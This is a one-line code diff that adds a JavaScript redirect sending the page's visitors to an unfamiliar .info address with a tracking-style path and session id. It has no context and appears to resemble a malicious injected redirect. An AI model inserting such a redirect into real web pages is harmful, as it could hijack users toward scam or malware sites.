@@ -1,0 +1,1 @@
+window.location.href = "https://respectlessly.info/wXqt/go?sid=7744";
